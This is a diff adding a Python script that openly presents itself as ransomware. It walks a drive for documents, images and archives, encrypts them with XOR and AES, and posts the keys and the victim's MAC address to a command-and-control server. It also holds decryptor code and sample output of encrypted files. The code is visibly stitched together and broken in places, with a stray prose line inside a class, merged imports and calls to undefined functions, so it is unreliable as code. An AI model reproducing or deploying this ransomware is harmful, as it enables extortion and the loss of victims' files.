@@ -1,0 +1,287 @@
+#!/usr/bin/python
+
+# Loading all necessary Libraries for key generation, encryption and decryption
+
+import binascii
+# Importing the Modules for running 64 Based Decoding of encryption Keys that can handle by any Operating Systems
+import base64
+# Importing the module for collecting MAC address for target Attack
+import getmac
+# Importing the Library for resolving URL
+import urllib
+# Importing the library to work files on any Operating Systems
+import os
+# Importing and loading hash library to encrypt
+import hashlib
+# Import socket module to connect with client in Hardware Layer
+import socket
+# Import thred module to handle every singlr instruction
+import thread
+# to load webbrowser to go to specific website eg bitcoin
+import webbrowser 
+# so we can intereact with windows dlls and change windows background etc
+import ctypes 
+# used for downloading and saving background image
+import urllib.request 
+# used to make get reqeust to api.ipify.org to get target machine ip addr
+import requests
+# used to time.sleep interval for ransom note & check desktop to decrypt system/files
+import time 
+# to give time limit on ransom note
+import datetime 
+# to create process for notepad and open ransom note
+import subprocess 
+
+# Using modules for using Crypto-cypher algorithm to generate random keys for encryption
+
+from colored import fg, attr
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from Crypto import Random
+from Crypto.Random import get_random_bytesimport sys
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+from Crypto.Cipher import PKCS1_OAEP, AES 
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.fernet import Fernet
+from cryptography.fernet import Fernet 
+
+
+
+# Generating Public and Private Keys for RSA Encryption and Decryption 
+
+key = RSA.generate(2048)
+
+private_key = key.export_key()
+with open('private.pem', 'wb') as f:
+    f.write(private_key)
+
+public_key = key.publickey().export_key()
+with open('public.pem', 'wb') as f:
+    f.write(public_key)
+def keygen(passwd, name):
+    
+    password = passwd.encode()
+    salt = b'\x82k\x19r%j\xe6\xf6\xda\x94&h9\xfd\xba\x0c' 
+    kdf = PBKDF2HMAC(
+	    algorithm=hashes.SHA256(),
+	    length=32,
+	    salt=salt,
+	    iterations = 1000000,
+	    backend=default_backend()
+    )
+    key = base64.urlsafe_b64encode(kdf.derive(password))
+    
+    file = open(name+".key", "wb")
+    file.write(key)
+    file.close()
+    return key
+
+
+
+#LIST ALL FILES FOR PARTICULAR FILE EXTENTIONS AND INVOKE FILE ENCTYPT FUNCTION.
+def filelist():
+    mylist = [".txt",".pdf","png","jpg","docx","doc","xls","ppt","pptx","rar","zip",".mp3",".wmv",".mp4"]
+    for root, dirs, files in os.walk("c:/"):
+        for file in files:
+            for ext in mylist:    
+                if file.endswith(ext):
+                    ally = os.path.join(root, file)
+                    print(ally)
+                    file_ecrypt(key, ally)
+
+
+
+# The main encryption format class and attributes
+class Ransomware:
+	def encrypt(self, file):
+		print("{}[+] encrypting -> {}{}".format(fg(9), file, attr(0)))
+		fd = open(file, "rb")
+		data = binascii.hexlify(fd.read())
+		fd.close()
+
+		# Basic XOR algorithm to convert binary to ASCII encryption
+		xored_data = b""
+		i = 0
+		while i < len(data):
+			xored_data += chr(data[i] ^ self.xor_key[i % len(self.xor_key)]).encode()
+			i += 1
+
+		# Writing AES-256-CBC Encryption
+		cipher = AES.new(self.enc_key, AES.MODE_CBC, self.iv)
+		ciphertext = cipher.encrypt(pad(xored_data, AES.block_size))
+
+		# write encrypted file to disk
+		fd = open(file, "wb")
+		fd.write(ciphertext)
+		fd.close()
+
+
+	def generate_keys(self):
+		# generate encryption keys
+		print("{}[*] generating encryption keys...{}".format(fg(10), attr(0)))
+		self.xor_key = binascii.hexlify(Random.new().read(AES.block_size - 8))
+		self.enc_key = hashlib.sha256(self.xor_key + Random.new().read(AES.block_size)).digest()
+		self.iv = Random.new().read(AES.block_size)
+		self.victim_mac_address = getmac.get_mac_address().encode()
+		self.save_keys()
+
+Private key generation based on MAC address through a Control Server using random key generation methods
+	def save_keys(self):
+		# send encryption keys to command and control (C2) server
+		print("{}[*] saving encryption keys to command and control (C2) server...{}".format(fg(10), attr(0)))
+		c2_url = "http://127.0.0.1:1337/save_keys"
+		data = {"mac_address": self.encode_keys(self.victim_mac_address), "enc_key": self.encode_keys(self.enc_key), "xor_key": self.encode_keys(self.xor_key), "iv": self.encode_keys(self.iv)}
+		response = requests.post(c2_url, data = data)
+
+
+	def dir_to_encrypt(self, dir_name):
+		self.generate_keys()
+		# what directory to encrypt
+		print("{}[*] encrypting '{}' directory{}".format(fg(10), dir_name, attr(0)))
+		for root, subdirs, files in os.walk(dir_name):
+			for file in files:
+				self.encrypt("{}/{}".format(root, file))
+
+
+	def encode_keys(self, key):
+		# encode keys before sending to C2 server
+		return urllib.parse.quote(base64.b64encode(key))
+
+
+ransom = Ransomware()
+ransom.dir_to_encrypt("/insensitive-files")
+
+
+
+    
+ 
+#Decrypting Codes
+
+class Decryptor:
+	def decrypt(self, file):
+		print("{}[+] decrypting -> {}{}".format(fg(10), file, attr(0)))
+		fd = open(file, "rb")
+		ct = fd.read()
+		fd.close()
+
+		# AES Decryption
+		cipher = AES.new(self.enc_key, AES.MODE_CBC, self.iv)
+		xored_data = unpad(cipher.decrypt(ct), AES.block_size)
+
+		# XOR Decryption
+		plaintext = b""
+		i = 0
+		while i < len(xored_data):
+			plaintext += chr(xored_data[i] ^ self.xor_key[i % len(self.xor_key)]).encode()
+			i += 1
+
+		pt_data = open(file, "wb")
+		pt_data.write(binascii.unhexlify(plaintext))
+
+
+	def get_keys(self):
+		print("{}[*] retrieving encryption keys from command and control (C2) server...{}".format(fg(11), attr(0)))
+		# fetch decryption keys from command and control (C2) server
+		c2_url = "http://127.0.0.1:1337/get_keys"
+		victim_mac_address = urllib.parse.quote(base64.b64encode(getmac.get_mac_address().encode()))
+		params = {"mac_address": victim_mac_address}
+		response = requests.get(c2_url, params = params)
+		self.enc_key, self.xor_key, self.iv = response.text.split("|")
+
+		# base64 decode the encryption keys
+		self.enc_key = self.decode_keys(self.enc_key)
+		self.xor_key = self.decode_keys(self.xor_key)
+		self.iv = self.decode_keys(self.iv)
+
+
+	def dir_to_decrypt(self, dir_name):
+		self.get_keys()
+		# what directory to encrypt
+		print("{}[*] decrypting '{}' directory{}".format(fg(11), dir_name, attr(0)))
+		for root, subdirs, files in os.walk(dir_name):
+			for file in files:
+				self.decrypt("{}/{}".format(root, file))
+
+	def decode_keys(self, key):
+		return base64.b64decode(key)
+
+
+decryptor = Decryptor()
+decryptor.dir_to_decrypt("/insensitive-files")
+
+from cryptography.fernet import Fernet
+import os
+
+file = open(input("enter your key file location"),"rb")  
+key = file.read()
+file.close()
+import os
+
+def filelist():
+    mylist = []
+    for root, dirs, files in os.walk("."):
+        for file in files:
+            if file.endswith(".encrypted"):
+                mylist.append(os.path.join(root, file))
+
+    return mylist
+
+print(filelist())
+
+local = filelist()
+
+
+
+
+def file_decrypt(key, files):
+    
+    for name in files:
+        if (name!="Ransom_decrypt.py"): 
+            with open(name,'rb') as f:
+                data = f.read()
+
+            fernet = Fernet(key)
+            decrypted = fernet.decrypt(data)
+            decrypted_file = name + ".decrypted"
+            try:
+                with open(decrypted_file, 'wb') as f:
+                    f.write(decrypted)
+                    os.remove(name)
+            except:
+                continue
+
+file_decrypt(key, local)
+
+
+# Output
+
+/Python-Scripts/simple-ransomware-in-python-main/ransomware# ./ransomware.py 
+[*] generating encryption keys...
+[*] saving encryption keys to command and control (C2) server...
+[*] encrypting '/insensitive-files' directory
+[+] encrypting -> /insensitive-files/13.jpeg
+[+] encrypting -> /insensitive-files/Screenshot from 2021-09-05 14-43-43.png
+[+] encrypting -> /insensitive-files/11.jpeg
+[+] encrypting -> /insensitive-files/index.jpeg
+[+] encrypting -> /insensitive-files/abc
+[+] encrypting -> /insensitive-files/12.jpeg
+[+] encrypting -> /insensitive-files/pic-1.jpeg
+[+] encrypting -> /insensitive-files/Screenshot from 2021-01-10 23-13-29.png
+[+] encrypting -> /insensitive-files/abc.txt
+[+] encrypting -> /insensitive-files/experiment
+[+] encrypting -> /insensitive-files/15.jpg
+[+] encrypting -> /insensitive-files/3.png
+[+] encrypting -> /insensitive-files/123
+[+] encrypting -> /insensitive-files/2.jpeg
+[+] encrypting -> /insensitive-files/Screenshot from 2021-01-10 23-17-34.png
+[+] encrypting -> /insensitive-files/Screenshot from 2021-01-10 22-42-19.png
+[+] encrypting -> /insensitive-files/xyz
+[+] encrypting -> /insensitive-files/testing
+[+] encrypting -> /insensitive-files/Screenshot from 2021-09-05 16-23-43.png
+[+] encrypting -> /insensitive-files/4.jpeg
+[+] encrypting -> /insensitive-files/test
+
+
